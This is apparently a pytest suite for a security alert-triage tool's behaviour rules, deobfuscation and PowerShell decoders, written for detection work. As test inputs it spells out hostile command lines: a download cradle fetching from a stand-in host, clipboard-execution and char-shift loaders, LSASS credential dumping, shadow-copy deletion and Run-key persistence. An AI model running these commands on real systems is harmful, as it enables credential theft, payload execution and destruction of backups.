"""Tests for behavior rules, deobfuscation, PowerShell decoding, and escalation.

Behavior analysis is pure logic (no network), so most tests call analyze()
directly. Triage-level tests run under @respx.mock to prove no HTTP happens.
"""

import base64
import json
import re
from pathlib import Path

import pytest
import respx

import behavior
from behavior import analyze, behavior_verdict, decode_char_shift, decode_encoded_command
from models import Alert, BehaviorFinding
from triage import triage

ALERTS_DIR = Path(__file__).parent.parent / "alerts"

OFFICE = r"C:\Program Files\Microsoft Office\root\Office16"
SYSTEM32 = r"C:\Windows\System32"
POWERSHELL_EXE = rf"{SYSTEM32}\WindowsPowerShell\v1.0\powershell.exe"

CRADLE = "IEX (New-Object Net.WebClient).DownloadString('http://payload.example/a.ps1')"
CLIPBOARD_RUN = "Add-Type -AssemblyName System.Windows.Forms; iex ([Windows.Forms.Clipboard]::GetText())"


def shift(script: str, amount: int) -> str:
    """Move every character by `amount`, the way a char-shift obfuscator would."""
    return "".join(chr(ord(ch) + amount) for ch in script)


def shift_loader(script: str, amount: int = 3) -> str:
    """A PowerShell one-liner that undoes a shift of `amount` and runs the result."""
    return (
        f"powershell.exe -sta -c \"$e='{shift(script, amount)}'; $d=''; "
        f"foreach($c in $e.ToCharArray()){{ $d+=[char]([int]$c-{amount}) }}; $function:f=$d; f\""
    )


def encode(script: str, encoding: str = "utf-16-le") -> str:
    return base64.b64encode(script.encode(encoding)).decode()


def rule_ids(**alert_fields) -> set[str]:
    """Which rules fire on the raw alert (not counting decoded content)."""
    findings = analyze(Alert(hostname="WS-TEST-01", **alert_fields))
    return {f.rule_id for f in findings if not f.from_decoded}


def finding(rule_id: str, severity: str, from_decoded: bool = False) -> BehaviorFinding:
    return BehaviorFinding(
        rule_id=rule_id, rule_name=rule_id, techniques=[], severity=severity,
        matched_field="command_line", evidence="x", from_decoded=from_decoded,
    )


# --- One or more positive cases per rule -------------------------------------

POSITIVE_CASES = [
    ("encoded_powershell", {"command_line": f"powershell.exe -NoP -enc {encode('Write-Output hi')}"}),
    ("encoded_powershell", {"command_line": f"powershell -EncodedCommand {encode('Get-Date')}"}),
    ("encoded_powershell", {"command_line": f"pwsh -e {encode('Get-Date')}"}),
    ("encoded_powershell", {"command_line": f"powershell /ec {encode('Get-Date')}"}),
    ("encoded_powershell", {"command_line": f"powershell \u2013enco {encode('Get-Date')}"}),  # en dash
    ("powershell_download_cradle", {"command_line": f'powershell -c "{CRADLE}"'}),
    ("powershell_download_cradle", {"command_line": "powershell iwr http://x.example/a -OutFile a.exe"}),
    ("powershell_download_cradle", {"command_line": "powershell Invoke-WebRequest -Uri http://x.example/a"}),
    ("powershell_download_cradle", {"command_line": "powershell (New-Object Net.WebClient).DownloadFile('http://x.example/a','a.exe')"}),
    ("certutil_download", {"command_line": r"certutil.exe -urlcache -split -f http://files.example/a.txt C:\Users\a\AppData\Local\Temp\a.exe"}),
    ("certutil_download", {"command_line": r"certutil -decode C:\temp\in.b64 C:\temp\out.exe"}),
    ("mshta_execution", {"command_line": 'mshta.exe "http://x.example/a.hta"'}),
    ("mshta_execution", {"command_line": 'mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""calc"":close")'}),
    ("mshta_execution", {"command_line": r"mshta C:\Users\a\Downloads\invoice.hta"}),
    ("regsvr32_squiblydoo", {"command_line": "regsvr32 /s /n /u /i:http://x.example/f.sct scrobj.dll"}),
    ("regsvr32_squiblydoo", {"command_line": r"regsvr32.exe /u /n /i:C:\temp\f.sct scrobj.dll"}),
    ("rundll32_user_path", {"command_line": r"rundll32.exe C:\Users\a\AppData\Local\Temp\x.dll,Start"}),
    ("rundll32_user_path", {"command_line": r"rundll32 %PROGRAMDATA%\cache\x.dll,DllRegisterServer"}),
    ("office_spawns_shell", {"parent_process": rf"{OFFICE}\WINWORD.EXE", "file_path": POWERSHELL_EXE, "command_line": "powershell -nop -c Get-Date"}),
    ("office_spawns_shell", {"parent_process": rf"{OFFICE}\EXCEL.EXE", "command_line": rf"{SYSTEM32}\cmd.exe /c whoami"}),
    ("office_spawns_shell", {"parent_process": rf"{OFFICE}\POWERPNT.EXE", "file_path": rf"{SYSTEM32}\wscript.exe", "command_line": r"wscript C:\temp\a.vbs"}),
    ("schtasks_create", {"command_line": r"schtasks /create /tn Updater /tr C:\x.exe /sc onlogon"}),
    ("registry_run_key", {"command_line": r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v U /d C:\x.exe"}),
    ("registry_run_key", {"command_line": r'reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v U /d C:\x.exe /f'}),
    ("shadow_copy_deletion", {"command_line": "vssadmin.exe delete shadows /all /quiet"}),
    ("shadow_copy_deletion", {"command_line": "wmic shadowcopy delete"}),
    ("lsass_dump", {"command_line": "procdump.exe -accepteula -ma lsass.exe out.dmp"}),
    ("lsass_dump", {"command_line": r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\out\l.dmp full"}),
    ("discovery_commands", {"command_line": "whoami /all"}),
    ("discovery_commands", {"command_line": 'net group "Domain Admins" /domain'}),
    ("discovery_commands", {"command_line": "net user administrator"}),
    ("discovery_commands", {"command_line": "nltest /dclist:lab.example"}),
    ("discovery_commands", {"command_line": "systeminfo"}),
    ("user_writable_execution", {"file_path": r"C:\Users\a\Downloads\setup.exe"}),
    ("clipboard_execution", {"command_line": f'powershell -sta -c "{CLIPBOARD_RUN}"'}),
    ("clipboard_execution", {"command_line": 'powershell -c "Get-Clipboard | Invoke-Expression"'}),
    ("clipboard_execution", {"command_line": 'powershell -c "$function:x = Get-Clipboard; x"'}),
    ("clipboard_execution", {"command_line": 'powershell -sta -c "iex ([System.Windows.Forms.Clipboard]::GetText())"'}),
    ("char_shift_decoding", {"command_line": shift_loader("Get-Date")}),
    ("char_shift_decoding", {"command_line": "powershell -c \"$d=-join ('Ijw.Ebuf' -split '' | % { if ($_) { [char]([int][char]$_ - 1) } }); iex $d\""}),
    ("char_shift_decoding", {"command_line": "powershell -c \"$s='Fhw0Gdwh'; $o=''; for($i=0;$i -lt $s.Length;$i++){ $o+=[char]([int]$s[$i] - 3) }; & ([scriptblock]::Create($o))\""}),
    ("user_writable_execution", {"command_line": r'"C:\Users\a b\AppData\Roaming\x\run.exe" --silent'}),
]


@pytest.mark.parametrize("expected_rule, fields", POSITIVE_CASES)
def test_rule_matches(expected_rule, fields):
    assert expected_rule in rule_ids(**fields)


def test_every_rule_has_a_positive_test():
    tested = {rule_id for rule_id, _ in POSITIVE_CASES}
    assert tested == {rule.id for rule in behavior.RULES}


# --- Benign look-alikes that must NOT match ----------------------------------

FALSE_POSITIVE_CASES = [
    ("certutil_download", {"command_line": r"certutil -hashfile C:\iso\image.iso SHA256"}),
    ("certutil_download", {"command_line": "certutil -encode in.txt out.b64"}),
    ("encoded_powershell", {"command_line": r'powershell -File "C:\Program Files\LabOps\Scripts\Rotate-Logs.ps1"'}),
    ("encoded_powershell", {"command_line": "powershell -ExecutionPolicy Bypass -File script.ps1"}),
    ("encoded_powershell", {"command_line": f"certutil -encode {encode('hello world')}"}),  # not PowerShell
    ("powershell_download_cradle", {"command_line": r'powershell -File "C:\Program Files\LabOps\Scripts\Rotate-Logs.ps1"'}),
    ("powershell_download_cradle", {"command_line": "powershell Get-Process | Sort-Object CPU"}),
    ("rundll32_user_path", {"file_path": r"C:\Windows\System32\rundll32.exe", "command_line": "rundll32 shell32.dll,Control_RunDLL desk.cpl"}),
    ("rundll32_user_path", {"command_line": r"rundll32.exe C:\Windows\System32\printui.dll,PrintUIEntry /il"}),
    ("mshta_execution", {"command_line": "notepad.exe mshta-notes.txt"}),
    ("regsvr32_squiblydoo", {"command_line": r"regsvr32 /s C:\Windows\System32\vbscript.dll"}),
    ("office_spawns_shell", {"parent_process": r"C:\Windows\explorer.exe", "file_path": POWERSHELL_EXE, "command_line": "powershell"}),
    ("office_spawns_shell", {"parent_process": rf"{OFFICE}\WINWORD.EXE", "file_path": rf"{SYSTEM32}\splwow64.exe", "command_line": "splwow64.exe 8192"}),
    ("schtasks_create", {"command_line": "schtasks /query /fo LIST"}),
    ("registry_run_key", {"command_line": r"reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run"}),
    ("registry_run_key", {"command_line": r"reg add HKCU\Software\LabOps /v Setting /d 1"}),
    ("registry_run_key", {"command_line": r"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesX /v a /d b"}),
    ("shadow_copy_deletion", {"command_line": "vssadmin list shadows"}),
    ("lsass_dump", {"command_line": "procdump -ma notepad.exe notepad.dmp"}),
    ("discovery_commands", {"command_line": r"net use Z: \\fs01\share"}),
    ("discovery_commands", {"command_line": "powershell Get-NetUser"}),
    # Reading the clipboard is normal; only running it matches.
    ("clipboard_execution", {"command_line": r'powershell -NoProfile -c "Get-Clipboard | Set-Content C:\Users\a\notes\paste.txt"'}),
    ("clipboard_execution", {"command_line": 'powershell -sta -c "[Windows.Forms.Clipboard]::GetText() | Out-File clip.txt"'}),
    ("clipboard_execution", {"command_line": r'powershell -File "C:\Program Files\LabOps\Scripts\Export-Clipboard.ps1" -Source Get-Clipboard'}),
    ("clipboard_execution", {"command_line": 'powershell -c "Get-Date | Set-Clipboard; iex \'Write-Output done\'"'}),
    # Character arithmetic without running the result, or without a loop.
    ("char_shift_decoding", {"command_line": "powershell -c \"foreach($c in $s.ToCharArray()){ $u += [char]([int]$c - 32) }; Write-Output $u\""}),
    ("char_shift_decoding", {"command_line": 'powershell -c "Write-Output ([char](65+3))"'}),
    ("char_shift_decoding", {"command_line": "powershell -c \"$x=[char]([int]$c-3); iex $x\""}),
    ("user_writable_execution", {"file_path": r"C:\Program Files\LabOps\agent.exe", "command_line": r'"C:\Program Files\LabOps\agent.exe" --temp-dir C:\Users\a\AppData\Local\Temp'}),
]


@pytest.mark.parametrize("rule_that_must_not_match, fields", FALSE_POSITIVE_CASES)
def test_benign_lookalike_does_not_match(rule_that_must_not_match, fields):
    assert rule_that_must_not_match not in rule_ids(**fields)


def test_benign_admin_powershell_has_no_findings():
    fields = {
        "file_path": POWERSHELL_EXE,
        "parent_process": rf"{SYSTEM32}\svchost.exe",
        "command_line": r'powershell.exe -NoProfile -ExecutionPolicy AllSigned -File "C:\Program Files\LabOps\Scripts\Rotate-Logs.ps1"',
    }
    assert rule_ids(**fields) == set()


def test_ipconfig_has_no_findings():
    assert rule_ids(file_path=rf"{SYSTEM32}\ipconfig.exe", command_line="ipconfig /all") == set()


# --- Deobfuscation ------------------------------------------------------------

@pytest.mark.parametrize("expected_rule, command_line", [
    ("encoded_powershell", f"p^ow^ers^hell -e^nc {encode('Get-Date')}"),
    ("certutil_download", "c^e^r^t^u^t^i^l -url^cache -f http://x.example/a a.exe"),
    ("shadow_copy_deletion", 'vssadmin del""ete sha""dows /all'),
    ("schtasks_create", r"schtasks    /create   /tn  U /tr C:\x.exe"),
    ("lsass_dump", "proc^dump -ma ls^ass.exe out.dmp"),
])
def test_obfuscated_variants_still_match(expected_rule, command_line):
    assert expected_rule in rule_ids(command_line=command_line)


def test_deobfuscate():
    assert behavior.deobfuscate('p^ow""er^shell   -nop\t-c  x') == "powershell -nop -c x"


# --- Decoding encoded PowerShell ---------------------------------------------

def test_decode_then_match():
    alert = Alert(hostname="WS-TEST-01", command_line=f"powershell.exe -NoP -W Hidden -enc {encode(CRADLE)}")

    findings = analyze(alert)

    raw = {f.rule_id for f in findings if not f.from_decoded}
    decoded = {f.rule_id for f in findings if f.from_decoded}
    assert "encoded_powershell" in raw
    assert "powershell_download_cradle" not in raw  # Hidden by the encoding...
    assert "powershell_download_cradle" in decoded  # ...found after decoding.
    assert decode_encoded_command(alert.command_line) == CRADLE


@respx.mock
def test_decoded_findings_are_labelled_in_reasons():
    alert = Alert(hostname="WS-TEST-01", command_line=f"powershell -enc {encode(CRADLE)}")

    result = triage(alert)

    assert result.decoded_command == CRADLE
    assert result.verdict == "malicious"
    cradle_reason = next(r for r in result.reasons if "download cradle" in r)
    assert "decoded PowerShell command" in cradle_reason
    assert "[T1059.001, T1105]" in cradle_reason
    assert "IEX" in cradle_reason


def test_decode_falls_back_to_utf8():
    assert decode_encoded_command(f"powershell -enc {encode(CRADLE, 'utf-8')}") == CRADLE


def test_decode_restores_missing_padding():
    blob = encode("Get-Date").rstrip("=")
    assert decode_encoded_command(f"powershell -enc {blob}") == "Get-Date"


@pytest.mark.parametrize("blob", [
    "SQBFAFgAIAAoAE4AZQB3A",  # Valid base64 alphabet but impossible length.
    base64.b64encode(bytes(range(256)) * 2).decode(),  # Decodes to binary junk.
])
def test_invalid_base64_does_not_crash(blob):
    alert = Alert(hostname="WS-TEST-01", command_line=f"powershell -enc {blob}")

    findings = analyze(alert)

    assert decode_encoded_command(alert.command_line) is None
    assert "encoded_powershell" in {f.rule_id for f in findings}  # Still suspicious.
    assert not any(f.from_decoded for f in findings)


def test_decode_ignores_non_powershell():
    assert decode_encoded_command(f"certutil -enc {encode(CRADLE)}") is None


def test_decoded_size_is_capped():
    huge = "Write-Output 'A';" * 5_000  # ~85k characters.
    decoded = decode_encoded_command(f"powershell -enc {encode(huge)}")

    assert decoded.endswith("[truncated]")
    assert len(decoded) <= behavior.MAX_DECODED_CHARS + len("\n[truncated]")


# --- Verdict mapping and escalation ------------------------------------------

def test_severity_mapping():
    assert behavior_verdict([finding("a", "high")]) == "malicious"
    assert behavior_verdict([finding("a", "medium")]) == "suspicious"
    assert behavior_verdict([finding("a", "low")]) == "clean"  # Context only.
    assert behavior_verdict([]) == "clean"


def test_two_different_medium_findings_escalate_to_malicious():
    assert behavior_verdict([finding("a", "medium"), finding("b", "medium")]) == "malicious"


def test_same_medium_rule_twice_does_not_escalate():
    # e.g. schtasks /create in both the raw and the decoded command.
    findings = [finding("a", "medium"), finding("a", "medium", from_decoded=True)]
    assert behavior_verdict(findings) == "suspicious"


@respx.mock
def test_escalation_end_to_end():
    command = (
        r'cmd /c "schtasks /create /tn U /tr C:\x.exe /sc onlogon & '
        r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v U /d C:\x.exe"'
    )

    result = triage(Alert(hostname="WS-TEST-01", command_line=command))

    assert {f.rule_id for f in result.behavior_findings} == {"schtasks_create", "registry_run_key"}
    assert result.verdict == "malicious"
    assert any("escalate" in r for r in result.reasons)


@respx.mock
def test_low_findings_do_not_change_verdict():
    result = triage(Alert(hostname="WS-TEST-01", command_line="whoami /all"))

    assert result.verdict == "clean"
    assert result.behavior_findings[0].rule_id == "discovery_commands"
    assert "context only" in result.reasons[0]
    assert result.tactics == ["Discovery"]


# --- Sample alerts -----------------------------------------------------------

@respx.mock
@pytest.mark.parametrize("filename, expected_verdict, expected_rules", [
    ("encoded_powershell.json", "malicious", {"encoded_powershell", "powershell_download_cradle"}),
    ("certutil_download.json", "malicious", {"certutil_download"}),
    ("shadow_delete.json", "malicious", {"shadow_copy_deletion"}),
    ("office_macro.json", "malicious", {"office_spawns_shell"}),
    ("benign_admin.json", "clean", set()),
])
def test_offline_sample_alerts(filename, expected_verdict, expected_rules):
    """These samples only have reserved IPs/domains, so triage makes no HTTP calls."""
    alert = Alert.model_validate_json((ALERTS_DIR / filename).read_text())

    result = triage(alert)

    assert result.verdict == expected_verdict
    assert {f.rule_id for f in result.behavior_findings} == expected_rules
    assert len(respx.calls) == 0


def test_multi_indicator_sample_triggers_office_rule():
    alert = Alert.model_validate_json((ALERTS_DIR / "multi_indicator.json").read_text())

    assert "office_spawns_shell" in {f.rule_id for f in analyze(alert)}


def test_sample_alerts_use_only_reserved_network_values():
    for path in ALERTS_DIR.glob("*.json"):
        data = json.loads(path.read_text())
        if data.get("domain"):
            assert data["domain"].endswith(".example"), path.name


# --- Decoding character-shifted strings ---------------------------------------

def test_char_shift_decoding():
    assert decode_char_shift(shift_loader(CLIPBOARD_RUN)) == CLIPBOARD_RUN


def test_char_shift_decoding_reads_the_raw_command_line():
    # A shifted "[" is "^", which deobfuscate() strips. Decoding must not lose it.
    command_line = shift_loader("[Windows.Forms.Clipboard]::GetText()")
    assert "^" in command_line

    assert decode_char_shift(command_line) == "[Windows.Forms.Clipboard]::GetText()"


def test_char_shift_decoding_with_a_plus_shift():
    command_line = f"powershell -c \"$e='{shift('Get-Process', -2)}'; $d=''; foreach($c in $e.ToCharArray()){{ $d+=[char]([int]$c + 2) }}; iex $d\""

    assert decode_char_shift(command_line) == "Get-Process"


@pytest.mark.parametrize("command_line", [
    None,
    "",
    "powershell -c \"Write-Output 'no shift in this command line'\"",  # No [char](...).
    "powershell -c \"$d=[char](65+3); Write-Output 'Fhw0Gdwh0Wklqj'\"",  # Constant, no variable.
    "powershell -c \"foreach($c in $s){ $d+=[char]([int]$c-0) }; Write-Output 'Fhw0Gdwh0Wklqj'\"",  # Shift of 0.
    "powershell -c \"foreach($c in $s){ $d+=[char]([int]$c-32) }; Write-Output 'HELLO WORLD!'\"",  # Case conversion.
    "powershell -c \"foreach($c in $s){ $d+=[char]([int]$c-3) }; iex $d\"",  # No literal to decode.
    "powershell -c \"foreach($c in $s){ $d+=[char]([int]$c-25) }; Write-Output 'abc def ghi'\"",  # Not text after the shift.
])
def test_char_shift_decoding_negative(command_line):
    assert decode_char_shift(command_line) is None


def test_char_shift_decoding_is_capped():
    huge = "Write-Output hello; " * 2_000  # 40,000 characters
    decoded = decode_char_shift(shift_loader(huge))

    assert decoded.endswith("\n[truncated]")
    assert len(decoded) <= behavior.MAX_DECODED_CHARS + len("\n[truncated]")


def test_rules_run_on_char_shift_decoded_command():
    findings = analyze(Alert(hostname="WS-TEST-01", command_line=shift_loader(CLIPBOARD_RUN)))

    raw = {f.rule_id for f in findings if f.decoder is None}
    shifted = {f.rule_id for f in findings if f.decoder == "char_shift"}
    assert raw == {"char_shift_decoding"}
    assert "clipboard_execution" in shifted
    assert all(f.from_decoded for f in findings if f.decoder)


@respx.mock
def test_char_shift_findings_are_named_in_reasons():
    result = triage(Alert(hostname="WS-TEST-01", command_line=shift_loader(CLIPBOARD_RUN)))

    assert result.verdict == "malicious"
    assert result.shift_decoded_command == CLIPBOARD_RUN
    assert any(
        r.startswith("behavior: PowerShell executes clipboard contents") and "in char-shift-decoded command" in r
        for r in result.reasons
    )
    assert len(respx.calls) == 0


def test_encoded_command_findings_name_their_decoder():
    findings = analyze(Alert(hostname="WS-TEST-01", command_line=f"powershell -enc {encode(CRADLE)}"))

    assert {f.decoder for f in findings if f.from_decoded} == {"encoded_command"}


def test_sample_alert_urls_are_example_only():
    for path in ALERTS_DIR.glob("*.json"):
        for host in re.findall(r"https?://([^/\s'\"]+)", path.read_text()):
            assert host.endswith(".example"), (path.name, host)
